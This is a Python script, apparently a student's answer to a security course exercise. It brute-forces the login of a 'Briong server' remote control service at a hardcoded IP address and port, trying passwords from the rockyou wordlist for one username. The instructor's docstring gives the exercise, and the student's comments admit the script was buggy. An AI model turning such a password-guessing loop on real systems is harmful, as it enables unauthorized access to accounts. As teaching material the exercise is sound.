"""
    If you know the IP address of the Briong server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:

        $ nc <ip address here> <port here>

    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.

    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.

    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.

    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.

"""

import socket

host = "142.93.117.193" # IP address here
port = 1337 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file

def brute_force():
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command

        General idea:

            Given that you know a potential username, use a wordlist and iterate
            through each possible password and repeatedly attempt to login to
            the Briong server.
    """

    username = "kruegster"   # Hint: use OSINT
    password = open(wordlist, 'r')   # Hint: use wordlist

   #Opening the socket as documented above
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    #A counter to keep track of how many passwords I try
    count = 0

    
    #Password is now the text file rockyou.txt. This iterates through each line of the 
    #file (there is one password per line), and tries the combination. First, it reads 
    #data, which should be the "Username: " prompt. Then, it sends the username. Next, it 
    #recieves data, which shoul be the "Password:" prompt. It then sends the next password 
    #in the file. Theoretically I hoped this would work, but something was off. It was apparently
    #trying 200 - 800 passwords, but then the pipe would break. I hope the logic is right,
    #I just haven't had much experience working with sockets so perhaps the syntax is wrong.
    #There is also the possibility that my reading/writing from the pipe is out of sync,
    #perhaps I had to wait after each iteration. I would have liked to fix it but I managed
    #to manually crack the credentials and it's getting really close to midnight, so
    #this is the best I could do.
    for x in password:
        
        count = count + 1
        print(count)
        #Recieve username prompt
        data = s.recv(1024)
        print(data)
        #Send username
        s.send(username + "\n")
        print(username)

        #Recieve password prompt
        data = s.recv(1024)
        print(data)
        #Send password
        s.send(x + "\n")
        print(x)

       #I thought maybe I had to recieve the "Fail" prompt after each
       #incorrect combination, and that would help the pipe not break,
       #but it turns out that this next bit of code does very little to
       #make a difference.
        data = s.recv(1024)
        print(data)
      




if __name__ == '__main__':
    brute_force()
